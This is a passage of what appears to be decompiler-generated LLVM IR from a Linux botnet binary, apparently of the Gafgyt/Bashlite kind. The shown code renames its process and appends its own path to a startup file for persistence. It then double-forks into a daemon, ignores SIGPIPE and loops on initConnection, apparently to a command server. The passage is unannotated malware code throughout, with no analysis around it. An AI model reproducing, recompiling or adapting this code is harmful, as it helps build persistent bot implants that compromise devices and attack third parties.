  br label %dec_label_pc_804fcce

dec_label_pc_804fcce:                             ; preds = %dec_label_pc_804fc92, %dec_label_pc_804fcce
  %storemerge40 = phi i32 [ 0, %dec_label_pc_804fc92 ], [ %v4_804fce8, %dec_label_pc_804fcce ]
  %v2_804fcdd = add i32 %storemerge40, %v2_804fcd7
  %v1_804fce0 = inttoptr i32 %v2_804fcdd to i8*
  %v2_804fce0 = load i8, i8* %v1_804fce0, align 1
  %v3_804fce2 = add i32 %storemerge40, ptrtoint (i8** @global_var_805b530.447 to i32)
  %v4_804fce2 = inttoptr i32 %v3_804fce2 to i8*
  store i8 %v2_804fce0, i8* %v4_804fce2, align 1
  %v4_804fce8 = add nuw nsw i32 %storemerge40, 1
  %exitcond = icmp eq i32 %v4_804fce8, 6
  br i1 %exitcond, label %dec_label_pc_804fcf1.loopexit, label %dec_label_pc_804fcce

dec_label_pc_804fcf1.loopexit:                    ; preds = %dec_label_pc_804fcce
  br label %dec_label_pc_804fcf1

dec_label_pc_804fcf1:                             ; preds = %dec_label_pc_804fcf1.loopexit, %dec_label_pc_804fc7a
  %v2_804fcf7 = call i32 @__libc_close(i32 %v5_804fb1e)
  %v3_804fd0d.pre = load i32, i32* %stack_var_-4204, align 4
  br label %dec_label_pc_804fd0d

dec_label_pc_804fd01:                             ; preds = %dec_label_pc_804fbb2, %dec_label_pc_804fb3e, %entry
  store i32 0, i32* %stack_var_-4204, align 4
  br label %dec_label_pc_804fd0d

dec_label_pc_804fd0d:                             ; preds = %dec_label_pc_804fcf1, %dec_label_pc_804fd01
  %v3_804fd0d = phi i32 [ %v3_804fd0d.pre, %dec_label_pc_804fcf1 ], [ 0, %dec_label_pc_804fd01 ]
  ret i32 %v3_804fd0d

; uselistorder directives
  uselistorder i32 %v5_804fc2c, { 1, 0 }
  uselistorder i32 %v2_804fc5c, { 2, 4, 0, 3, 1 }
  uselistorder i32 %v5_804fbf9, { 2, 1, 0 }
  uselistorder i32 %v5_804fb1e, { 2, 1, 3, 4, 0 }
  uselistorder i32* %stack_var_-4204, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i8* %stack_var_-4156, { 4, 2, 0, 1, 3 }
  uselistorder i8 9, { 1, 0, 2, 3 }
  uselistorder i32 (i32)* @htons, { 11, 10, 9, 8, 7, 6, 5, 4, 12, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804fd0d, { 1, 0 }
  uselistorder label %dec_label_pc_804fcce, { 1, 0 }
  uselistorder label %dec_label_pc_804fc7a, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804fc2c, { 1, 0 }
  uselistorder label %dec_label_pc_804fc06, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([9 x i8]* @global_var_8059189.448 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i8*, align 4
  %tmp104 = call i8* @__decompiler_undefined_function_2()
  %tmp113 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-5744 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-512 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-5888 = alloca i8*, align 4
  %stack_var_-5872 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_804fd1f = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_804fd1f, i32* %stack_var_-24, align 4
  %v5_804fd30 = icmp ult i32* %stack_var_-24, inttoptr (i32 5848 to i32*)
  store i1 %v5_804fd30, i1* %cf.global-to-local, align 1
  store i32 %v2_804fd1f, i32* %edx.global-to-local, align 4
  %v1_804fd49 = add i32 %v2_804fd1f, 4
  %v2_804fd49 = inttoptr i32 %v1_804fd49 to i32*
  %v3_804fd49 = load i32, i32* %v2_804fd49, align 4
  store i32 %v3_804fd49, i32* %eax.global-to-local, align 4
  %v1_804fd4c = inttoptr i32 %v3_804fd49 to i32*
  %v2_804fd4c = load i32, i32* %v1_804fd4c, align 4
  %v1_804fd59 = and i32 %v2_804fd4c, -256
  store i32 %v1_804fd59, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804fd5c = inttoptr i32 %v2_804fd4c to i8*
  store i32 %v2_804fd4c, i32* @edi, align 4
  %v3_804fd62 = call i32 @_strlen(i8* %v4_804fd5c)
  %v4_804fd62 = mul i32 %v3_804fd62, -1
  %v1_804fd66 = sub i32 1, %v4_804fd62
  store i32 %v1_804fd66, i32* %eax.global-to-local, align 4
  %v1_804fd68 = sub i32 0, %v4_804fd62
  store i32 %v1_804fd68, i32* %edx.global-to-local, align 4
  %v3_804fd71 = load i32, i32* %v2_804fd49, align 4
  store i32 %v3_804fd71, i32* %eax.global-to-local, align 4
  %v1_804fd74 = inttoptr i32 %v3_804fd71 to i32*
  %v2_804fd74 = load i32, i32* %v1_804fd74, align 4
  store i32 %v2_804fd74, i32* %eax.global-to-local, align 4
  %v0_804fd76 = load i32, i32* @esp, align 4
  %v5_804fd76 = icmp ult i32 %v0_804fd76, 4
  store i1 %v5_804fd76, i1* %cf.global-to-local, align 1
  %v5_804fd7f = inttoptr i32 %v2_804fd74 to i8*
  store i8* %v5_804fd7f, i8** %stack_var_-5888, align 4
  %v5_804fd80 = call i32 @strncpy(i8* %v5_804fd7f, i32 ptrtoint (i32* @global_var_8059192.449 to i32), i32 %v1_804fd68)
  store i32 %v5_804fd80, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8059192.449 to i32), i32* %edx.global-to-local, align 4
  store i32 %v2_804fd1f, i32* @esi, align 4
  %v3_804fd93 = load i32, i32* %v2_804fd49, align 4
  %v2_804fd96 = inttoptr i32 %v3_804fd93 to i32*
  store i32 ptrtoint (i32* @global_var_8059192.449 to i32), i32* %v2_804fd96, align 4
  store i32 ptrtoint (i32* @global_var_8059192.449 to i32), i32* %eax.global-to-local, align 4
  %v0_804fd9b = load i32, i32* @esp, align 4
  %v5_804fd9b = icmp ult i32 %v0_804fd9b, 12
  store i1 %v5_804fd9b, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v6_804fda7 = call i32 @prctl(i32 15, i32 ptrtoint (i32* @global_var_8059192.449 to i32), i32 0, i32 0, i32 0)
  store i32 %v6_804fda7, i32* %eax.global-to-local, align 4
  %v5_804fdaf = icmp ult i32* %stack_var_-5872, inttoptr (i32 12 to i32*)
  store i1 %v5_804fdaf, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v3_804fdb4 = call i32 @__GI_time(i32* null)
  store i32 %v3_804fdb4, i32* %eax.global-to-local, align 4
  %v0_804fdb9 = load i32, i32* @esp, align 4
  %v2_804fdb9 = icmp ugt i32 %v0_804fdb9, -17
  store i1 %v2_804fdb9, i1* %cf.global-to-local, align 1
  store i32 %v3_804fdb4, i32* @ebx, align 4
  %v0_804fdbe = call i32 @__libc_getpid()
  %v1_804fdc3 = load i32, i32* @ebx, align 4
  %v2_804fdc3 = xor i32 %v1_804fdc3, %v0_804fdbe
  store i32 %v2_804fdc3, i32* @eax, align 4
  %v0_804fdc5 = load i32, i32* @esp, align 4
  %v5_804fdc5 = icmp ult i32 %v0_804fdc5, 12
  store i1 %v5_804fdc5, i1* %cf.global-to-local, align 1
  %v5_804fdc8 = inttoptr i32 %v2_804fdc3 to i8*
  store i8* %v5_804fdc8, i8** %stack_var_-5888, align 4
  %v2_804fdc9 = call i32 @srand(i32 %v2_804fdc3)
  store i32 %v2_804fdc9, i32* %eax.global-to-local, align 4
  store i1 %v5_804fdaf, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v3_804fdd6 = call i32 @__GI_time(i32* null)
  store i32 %v3_804fdd6, i32* %eax.global-to-local, align 4
  %v0_804fddb = load i32, i32* @esp, align 4
  %v2_804fddb = icmp ugt i32 %v0_804fddb, -17
  store i1 %v2_804fddb, i1* %cf.global-to-local, align 1
  store i32 %v3_804fdd6, i32* @ebx, align 4
  %v0_804fde0 = call i32 @__libc_getpid()
  %v1_804fde5 = load i32, i32* @ebx, align 4
  %v2_804fde5 = xor i32 %v1_804fde5, %v0_804fde0
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v2_804fde5, i32* %eax.global-to-local, align 4
  %v1_804fde8 = call i32 @init_rand(i32 %v2_804fde5)
  store i32 %v1_804fde8, i32* @eax, align 4
  %v5_804fdfe = icmp ult i32* %stack_var_-5872, inttoptr (i32 8 to i32*)
  store i1 %v5_804fdfe, i1* %cf.global-to-local, align 1
  %tmp160 = bitcast i8** %stack_var_-5888 to i32*
  store i32 ptrtoint ([19 x i8]* @global_var_8059193.450 to i32), i32* %tmp160, align 4
  %v3_804fe09 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_8059193.450 to i32), i32 ptrtoint (i32* @global_var_80591a6.451 to i32))
  store i32 %v3_804fe09, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fe14 = icmp eq i32 %v3_804fe09, 0
  %v1_804fe18 = icmp eq i1 %v4_804fe14, false
  br i1 %v1_804fe18, label %dec_label_pc_804fe37, label %dec_label_pc_804fe1a

dec_label_pc_804fe1a:                             ; preds = %entry
  store i1 %v5_804fdfe, i1* %cf.global-to-local, align 1
  store i32 ptrtoint ([13 x i8]* @global_var_80591a8.452 to i32), i32* %tmp160, align 4
  %v3_804fe2c = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_80591a8.452 to i32), i32 ptrtoint (i32* @global_var_80591a6.451 to i32))
  store i32 %v3_804fe2c, i32* %eax.global-to-local, align 4
  %v0_804fe31 = load i32, i32* @esp, align 4
  %v2_804fe31 = icmp ugt i32 %v0_804fe31, -17
  store i1 %v2_804fe31, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804fe37

dec_label_pc_804fe37:                             ; preds = %entry, %dec_label_pc_804fe1a
  %stack_var_-88.0 = phi i32 [ %v3_804fe09, %entry ], [ %v3_804fe2c, %dec_label_pc_804fe1a ]
  %v3_804ff8713 = phi i32 [ ptrtoint ([19 x i8]* @global_var_8059193.450 to i32), %entry ], [ ptrtoint ([13 x i8]* @global_var_80591a8.452 to i32), %dec_label_pc_804fe1a ]
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fe37 = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v4_804fe37, label %dec_label_pc_804ffde, label %dec_label_pc_804fe41

dec_label_pc_804fe41:                             ; preds = %dec_label_pc_804fe37
  %v3_804fe47 = load i32, i32* %v2_804fd49, align 4
  store i32 %v3_804fe47, i32* %eax.global-to-local, align 4
  %v1_804fe4a = inttoptr i32 %v3_804fe47 to i32*
  %v2_804fe4a = load i32, i32* %v1_804fe4a, align 4
  %v1_804fe57 = and i32 %v2_804fe4a, -256
  store i32 %v1_804fe57, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804fe5a = inttoptr i32 %v2_804fe4a to i8*
  store i32 %v2_804fe4a, i32* @edi, align 4
  %v3_804fe60 = call i32 @_strlen(i8* %v4_804fe5a)
  %v0_804fe71 = load i32, i32* @esp, align 4
  %v5_804fe71 = icmp ult i32 %v0_804fe71, 8
  store i1 %v5_804fe71, i1* %cf.global-to-local, align 1
  %v2_804fe79 = ptrtoint i32* %stack_var_-368 to i32
  store i32 %v2_804fe79, i32* %eax.global-to-local, align 4
  %tmp161 = bitcast i32* %stack_var_-368 to i8*
  store i8* %tmp161, i8** %stack_var_-5888, align 4
  %v3_804fe80 = call i32 @getcwd(i32 %v2_804fe79, i32 256)
  %v0_804fe85 = load i32, i32* @esp, align 4
  %v2_804fe85 = icmp ugt i32 %v0_804fe85, -17
  store i1 %v2_804fe85, i1* %cf.global-to-local, align 1
  store i32 %v2_804fe79, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v2_804fe79, i32* @esi, align 4
  store i32 ptrtoint (i8** @global_var_80591b5.453 to i32), i32* @edi, align 4
  %v7_804febb = call i32 @_strncmp(i8* %tmp161, i8* bitcast (i8** @global_var_80591b5.453 to i8*), i32 2)
  %v8_804febb = urem i32 %v7_804febb, 2
  %v9_804febb = icmp eq i32 %v8_804febb, 0
  %v0_804febd = load i1, i1* %cf.global-to-local, align 1
  %v2_804febd = or i1 %v0_804febd, %v9_804febb
  %v3_804febd = zext i1 %v2_804febd to i32
  %v4_804febd = load i32, i32* @edx, align 4
  %v5_804febd = and i32 %v4_804febd, -256
  %v6_804febd = or i32 %v3_804febd, %v5_804febd
  %v7_804febd = xor i32 %v6_804febd, 1
  store i32 %v7_804febd, i32* %edx.global-to-local, align 4
  %v5_804fec0 = ptrtoint i32* %stack_var_-512 to i32
  %v3_804fec3 = and i32 %v7_804febb, -256
  %v1_804fec5 = trunc i32 %v7_804febd to i8
  %v3_804fec5 = trunc i32 %v5_804fec0 to i8
  %v4_804fec5 = sub i8 %v1_804fec5, %v3_804fec5
  %v15_804fec5 = icmp eq i8 %v4_804fec5, 0
  %v20_804fec5 = zext i8 %v4_804fec5 to i32
  %v23_804fec5 = or i32 %v20_804fec5, %v3_804fec3
  store i32 %v23_804fec5, i32* @ecx, align 4
  %v2_804fec9 = sext i8 %v4_804fec5 to i32
  store i32 %v2_804fec9, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v15_804fec5, label %dec_label_pc_804ffd0, label %dec_label_pc_804fed9.preheader

dec_label_pc_804fed9.preheader:                   ; preds = %dec_label_pc_804fe41
  br label %dec_label_pc_804fed9

dec_label_pc_804fed6:                             ; preds = %dec_label_pc_804fed9
  %v4_804fed6 = add i32 %stack_var_-84.0, -1
  br label %dec_label_pc_804fed9

dec_label_pc_804fed9:                             ; preds = %dec_label_pc_804fed9.preheader, %dec_label_pc_804fed6
  %stack_var_-84.0 = phi i32 [ %v4_804fed6, %dec_label_pc_804fed6 ], [ %v3_804fe60, %dec_label_pc_804fed9.preheader ]
  store i32 %v2_804fd1f, i32* @esi, align 4
  %v3_804fedf = load i32, i32* %v2_804fd49, align 4
  store i32 %v3_804fedf, i32* %eax.global-to-local, align 4
  %v1_804fee2 = inttoptr i32 %v3_804fedf to i32*
  %v2_804fee2 = load i32, i32* %v1_804fee2, align 4
  store i32 %v2_804fee2, i32* %edx.global-to-local, align 4
  %v2_804fee7 = add i32 %v2_804fee2, %stack_var_-84.0
  store i32 %v2_804fee7, i32* %eax.global-to-local, align 4
  %v1_804feea = inttoptr i32 %v2_804fee7 to i8*
  %v2_804feea = load i8, i8* %v1_804feea, align 1
  %v3_804feea = zext i8 %v2_804feea to i32
  %v5_804feea = and i32 %v2_804fee7, -256
  %v6_804feea = or i32 %v3_804feea, %v5_804feea
  store i32 %v6_804feea, i32* %eax.global-to-local, align 4
  %v6_804feec = icmp ult i8 %v2_804feea, 47
  store i1 %v6_804feec, i1* %cf.global-to-local, align 1
  %v10_804feec = icmp eq i8 %v2_804feea, 47
  %v1_804feee = icmp eq i1 %v10_804feec, false
  br i1 %v1_804feee, label %dec_label_pc_804fed6, label %dec_label_pc_804fef0

dec_label_pc_804fef0:                             ; preds = %dec_label_pc_804fed9
  store i32 %v2_804fd1f, i32* @edi, align 4
  %v3_804fef6 = load i32, i32* %v2_804fd49, align 4
  store i32 %v3_804fef6, i32* %eax.global-to-local, align 4
  %v1_804fef9 = inttoptr i32 %v3_804fef6 to i32*
  %v2_804fef9 = load i32, i32* %v1_804fef9, align 4
  store i32 %v2_804fef9, i32* %edx.global-to-local, align 4
  %v2_804fefe = add i32 %v2_804fef9, %stack_var_-84.0
  %v2_804ff0e = ptrtoint i32* %stack_var_-624 to i32
  store i32 %v2_804ff0e, i32* %eax.global-to-local, align 4
  %tmp162 = bitcast i32* %stack_var_-624 to i8*
  store i8* %tmp162, i8** %stack_var_-5888, align 4
  %v5_804ff15 = call i32 @sprintf(i32 %v2_804ff0e, i32 ptrtoint ([8 x i8]* @global_var_80591b7.454 to i32), i32 %v2_804fe79, i32 %v2_804fefe)
  store i32 %v5_804ff15, i32* %eax.global-to-local, align 4
  %v0_804ff1a = load i32, i32* @esp, align 4
  %v2_804ff1a = icmp ugt i32 %v0_804ff1a, -17
  store i1 %v2_804ff1a, i1* %cf.global-to-local, align 1
  %v8_804ff5c = inttoptr i32 %stack_var_-88.0 to i8*
  %tmp163 = inttoptr i32 %stack_var_-88.0 to i32*
  %v2_804ff2a = ptrtoint i32* %stack_var_-1648 to i32
  %tmp164 = bitcast i32* %stack_var_-1648 to i8*
  %v5_804ff1f = icmp ult i32* %stack_var_-5872, inttoptr (i32 4 to i32*)
  br label %dec_label_pc_804ff59.outer

dec_label_pc_804ff1f:                             ; preds = %dec_label_pc_804ff59
  store i1 %v5_804ff1f, i1* %cf.global-to-local, align 1
  store i32 %v2_804ff2a, i32* %eax.global-to-local, align 4
  store i8* %tmp164, i8** %stack_var_-5888, align 4
  %v4_804ff31 = call i32 @fgets(i32 %v2_804ff2a, i32 1024, i32 %stack_var_-88.0)
  store i1 %v5_804fdfe, i1* %cf.global-to-local, align 1
  store i32 %v2_804ff2a, i32* %eax.global-to-local, align 4
  store i8* %tmp164, i8** %stack_var_-5888, align 4
  %v4_804ff4a = call i32 @__GI_strcasecmp(i8* %tmp164, i32 %v2_804ff0e)
  store i32 %v4_804ff4a, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ff52 = icmp eq i32 %v4_804ff4a, 0
  %v1_804ff54 = icmp eq i1 %v1_804ff52, false
  br i1 %v1_804ff54, label %dec_label_pc_804ff59, label %dec_label_pc_804ff56

dec_label_pc_804ff56:                             ; preds = %dec_label_pc_804ff1f
  %v4_804ff56 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_804ff59.outer

dec_label_pc_804ff59.outer:                       ; preds = %dec_label_pc_804ff56, %dec_label_pc_804fef0
  %stack_var_-80.0.ph = phi i32 [ %v4_804ff56, %dec_label_pc_804ff56 ], [ 0, %dec_label_pc_804fef0 ]
  br label %dec_label_pc_804ff59

dec_label_pc_804ff59:                             ; preds = %dec_label_pc_804ff59.outer, %dec_label_pc_804ff1f
  store i1 %v5_804fdaf, i1* %cf.global-to-local, align 1
  store i8* %v8_804ff5c, i8** %stack_var_-5888, align 4
  %v3_804ff5f = call i32 @feof(i32* %tmp163)
  store i32 %v3_804ff5f, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ff67 = icmp eq i32 %v3_804ff5f, 0
  br i1 %v1_804ff67, label %dec_label_pc_804ff1f, label %dec_label_pc_804ff6b

dec_label_pc_804ff6b:                             ; preds = %dec_label_pc_804ff59
  %v4_804ff6b = icmp eq i32 %stack_var_-80.0.ph, 0
  %v1_804ff6f = icmp eq i1 %v4_804ff6b, false
  store i1 %v5_804fdaf, i1* %cf.global-to-local, align 1
  store i8* %v8_804ff5c, i8** %stack_var_-5888, align 4
  %tmp165 = inttoptr i32 %stack_var_-88.0 to i16*
  %v3_804ffc6 = call i32 @__GI_fclose(i16* %tmp165)
  store i32 %v3_804ffc6, i32* @eax, align 4
  %v0_804ffcb = load i32, i32* @esp, align 4
  %v2_804ffcb = icmp ugt i32 %v0_804ffcb, -17
  store i1 %v2_804ffcb, i1* %cf.global-to-local, align 1
  br i1 %v1_804ff6f, label %dec_label_pc_804ffde, label %dec_label_pc_804ff71

dec_label_pc_804ff71:                             ; preds = %dec_label_pc_804ff6b
  store i1 %v5_804fdfe, i1* %cf.global-to-local, align 1
  store i32 %v3_804ff8713, i32* %tmp160, align 4
  %v3_804ff8a = call i32 @__GI_fopen(i32 %v3_804ff8713, i32 ptrtoint (i32* @global_var_80591bf.455 to i32))
  store i32 %v3_804ff8a, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ff95 = icmp eq i32 %v3_804ff8a, 0
  br i1 %v4_804ff95, label %dec_label_pc_804ffde, label %dec_label_pc_804ff9b

dec_label_pc_804ff9b:                             ; preds = %dec_label_pc_804ff71
  store i1 %v5_804fdfe, i1* %cf.global-to-local, align 1
  store i32 %v2_804ff0e, i32* %eax.global-to-local, align 4
  store i8* %tmp162, i8** %stack_var_-5888, align 4
  %v3_804ffa8 = call i32 @__GI_fputs(i32 %v2_804ff0e, i32 %v3_804ff8a)
  store i32 %v3_804ffa8, i32* @eax, align 4
  store i1 %v5_804fdaf, i1* %cf.global-to-local, align 1
  %v8_804ffb3 = inttoptr i32 %v3_804ff8a to i8*
  store i8* %v8_804ffb3, i8** %stack_var_-5888, align 4
  %tmp166 = inttoptr i32 %v3_804ff8a to i16*
  %v3_804ffb6 = call i32 @__GI_fclose(i16* %tmp166)
  store i32 %v3_804ffb6, i32* %eax.global-to-local, align 4
  %v0_804ffbb = load i32, i32* @esp, align 4
  %v2_804ffbb = icmp ugt i32 %v0_804ffbb, -17
  store i1 %v2_804ffbb, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804ffde

dec_label_pc_804ffd0:                             ; preds = %dec_label_pc_804fe41
  %v0_804ffd0 = load i32, i32* @esp, align 4
  %v5_804ffd0 = icmp ult i32 %v0_804ffd0, 12
  store i1 %v5_804ffd0, i1* %cf.global-to-local, align 1
  %v8_804ffd3 = inttoptr i32 %stack_var_-88.0 to i8*
  store i8* %v8_804ffd3, i8** %stack_var_-5888, align 4
  %tmp167 = inttoptr i32 %stack_var_-88.0 to i16*
  %v3_804ffd6 = call i32 @__GI_fclose(i16* %tmp167)
  store i32 %v3_804ffd6, i32* %eax.global-to-local, align 4
  %v0_804ffdb = load i32, i32* @esp, align 4
  %v2_804ffdb = icmp ugt i32 %v0_804ffdb, -17
  store i1 %v2_804ffdb, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804ffde

dec_label_pc_804ffde:                             ; preds = %dec_label_pc_804ff6b, %dec_label_pc_804ff71, %dec_label_pc_804fe37, %dec_label_pc_804ff9b, %dec_label_pc_804ffd0
  %v0_804ffde = call i32 @getOurIP()
  store i32 %v0_804ffde, i32* %eax.global-to-local, align 4
  %v0_804ffe3 = load i8*, i8** %stack_var_-5888, align 4
  %v1_804ffe3 = ptrtoint i8* %v0_804ffe3 to i32
  %v2_804ffe3 = call i32 @__libc_fork(i32 %v1_804ffe3)
  store i32 %v2_804ffe3, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ffeb = icmp eq i32 %v2_804ffe3, 0
  br i1 %v4_804ffeb, label %dec_label_pc_8050015, label %dec_label_pc_8050046

dec_label_pc_8050015:                             ; preds = %dec_label_pc_804ffde
  store i1 false, i1* %cf.global-to-local, align 1
  %v0_8050015 = load i8*, i8** %stack_var_-5888, align 4
  %v1_8050015 = ptrtoint i8* %v0_8050015 to i32
  %v2_8050015 = call i32 @__libc_fork(i32 %v1_8050015)
  store i32 %v2_8050015, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805001d = icmp eq i32 %v2_8050015, 0
  br i1 %v4_805001d, label %dec_label_pc_805002d.thread, label %dec_label_pc_8050033

dec_label_pc_805002d.thread:                      ; preds = %dec_label_pc_8050015
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8050057

dec_label_pc_8050033:                             ; preds = %dec_label_pc_8050015
  %v0_8050023 = load i32, i32* @esp, align 4
  %v5_8050023 = icmp ult i32 %v0_8050023, 12
  store i1 %v5_8050023, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v2_8050028 = call i32 @__GI_exit(i32 0)
  store i32 ptrtoint ([13 x i8]* @global_var_80591c1.456 to i32), i32* %eax.global-to-local, align 4
  %v0_8050038 = load i32, i32* @esp, align 4
  %v5_8050038 = icmp ult i32 %v0_8050038, 12
  store i1 %v5_8050038, i1* %cf.global-to-local, align 1
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_80591c1.456, i32 0, i32 0), i8** %stack_var_-5888, align 4
  %v2_805003c = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_80591c1.456 to i32))
  store i32 %v2_805003c, i32* %eax.global-to-local, align 4
  %v0_8050041 = load i32, i32* @esp, align 4
  %v2_8050041 = icmp ugt i32 %v0_8050041, -17
  store i1 %v2_8050041, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8050057

dec_label_pc_8050046:                             ; preds = %dec_label_pc_804ffde
  %v0_804fff1 = load i32, i32* @esp, align 4
  %v5_804fff1 = icmp ult i32 %v0_804fff1, 4
  store i1 %v5_804fff1, i1* %cf.global-to-local, align 1
  %v2_804fff6 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v2_804fff6, i32* %eax.global-to-local, align 4
  %v8_804fffa = inttoptr i32 %v2_804ffe3 to i8*
  store i8* %v8_804fffa, i8** %stack_var_-5888, align 4
  %v4_804fffd = call i32 @__libc_waitpid(i32 %v2_804ffe3, i32 %v2_804fff6, i32 0)
  store i32 %v4_804fffd, i32* @eax, align 4
  store i1 %v5_804fdaf, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v2_805000a = call i32 @__GI_exit(i32 0)
  store i32 ptrtoint ([13 x i8]* @global_var_80591c1.456 to i32), i32* %eax.global-to-local, align 4
  %v0_805004b = load i32, i32* @esp, align 4
  %v5_805004b = icmp ult i32 %v0_805004b, 12
  store i1 %v5_805004b, i1* %cf.global-to-local, align 1
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_80591c1.456, i32 0, i32 0), i8** %stack_var_-5888, align 4
  %v2_805004f = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_80591c1.456 to i32))
  store i32 %v2_805004f, i32* %eax.global-to-local, align 4
  %v0_8050054 = load i32, i32* @esp, align 4
  %v2_8050054 = icmp ugt i32 %v0_8050054, -17
  store i1 %v2_8050054, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8050057

dec_label_pc_8050057:                             ; preds = %dec_label_pc_805002d.thread, %dec_label_pc_8050033, %dec_label_pc_8050046
  %v0_8050057 = call i32 @__GI_setsid()
  store i32 %v0_8050057, i32* %eax.global-to-local, align 4
  %v0_805005c = load i32, i32* @esp, align 4
  %v5_805005c = icmp ult i32 %v0_805005c, 12
  store i1 %v5_805005c, i1* %cf.global-to-local, align 1
  store i8* bitcast (i8** @global_var_80591b5.453 to i8*), i8** %stack_var_-5888, align 4
  %v2_8050064 = call i32 @chdir(i32 ptrtoint (i8** @global_var_80591b5.453 to i32))
  store i32 %v2_8050064, i32* %eax.global-to-local, align 4
  store i1 %v5_804fdfe, i1* %cf.global-to-local, align 1
  store i8* inttoptr (i32 13 to i8*), i8** %stack_var_-5888, align 4
  %v3_8050073 = call i32 @__bsd_signal(i32 13, i32 1)
  store i32 %v3_8050073, i32* %eax.global-to-local, align 4
  %v0_8050078 = load i32, i32* @esp, align 4
  %v2_8050078 = icmp ugt i32 %v0_8050078, -17
  store i1 %v2_8050078, i1* %cf.global-to-local, align 1
  %v2_8050735 = ptrtoint i32* %stack_var_-5744 to i32
  %tmp168 = bitcast i32* %stack_var_-5744 to i8*
  %tmp169 = bitcast i8** %stack_var_-36 to i32*
  %v2_80506ec = ptrtoint i32* %stack_var_-624 to i32
  %v2_8050528 = ptrtoint i32* %stack_var_-1648 to i32
  %v5_805039b = and i32 %v2_8050735, -256
  %v1_80503a8 = or i32 %v2_8050735, 1
  %storemerge16190 = inttoptr i32 %v1_80503a8 to i8*
  br label %dec_label_pc_805007d.outer

dec_label_pc_805007d.outer:                       ; preds = %dec_label_pc_8050367, %dec_label_pc_8050735, %dec_label_pc_8050057
  %stack_var_-28.0.ph = phi i32 [ %tmp, %dec_label_pc_8050057 ], [ %stack_var_-28.1.ph, %dec_label_pc_8050735 ], [ %stack_var_-28.1.ph, %dec_label_pc_8050367 ]
  %stack_var_-64.0.ph = phi i8* [ %tmp104, %dec_label_pc_8050057 ], [ %stack_var_-64.2.ph27, %dec_label_pc_8050735 ], [ %stack_var_-64.2.ph27, %dec_label_pc_8050367 ]
  %stack_var_-60.0.ph31 = phi i32 [ %tmp113, %dec_label_pc_8050057 ], [ %stack_var_-60.3, %dec_label_pc_8050735 ], [ %stack_var_-60.2, %dec_label_pc_8050367 ]
  %stack_var_-96.0.ph32 = phi i32 [ 0, %dec_label_pc_8050057 ], [ %stack_var_-96.2.ph29, %dec_label_pc_8050735 ], [ %v4_8050367, %dec_label_pc_8050367 ]
  %v0_805007d183 = call i32 @initConnection()
  store i32 %v0_805007d183, i32* %eax.global-to-local, align 4
  %v1_8050082184 = icmp eq i32 %v0_805007d183, 0
  %v0_8050095185 = load i32, i32* @esp, align 4
  %v5_8050095187 = icmp ult i32 %v0_8050095185, 12
  store i1 %v5_8050095187, i1* %cf.global-to-local, align 1
  br i1 %v1_8050082184, label %dec_label_pc_8050095, label %dec_label_pc_8050086

dec_label_pc_8050086:                             ; preds = %dec_label_pc_805007d.outer, %dec_label_pc_8050086
  %v0_8050095189 = phi i32 [ %v0_8050095, %dec_label_pc_8050086 ], [ %v0_8050095185, %dec_label_pc_805007d.outer ]
  %v1_8050089 = add i32 %v0_8050095189, -16
  %v2_8050089 = inttoptr i32 %v1_8050089 to i32*
  store i32 30, i32* %v2_8050089, align 4
  %v0_805008b = load i8*, i8** %stack_var_-5888, align 4
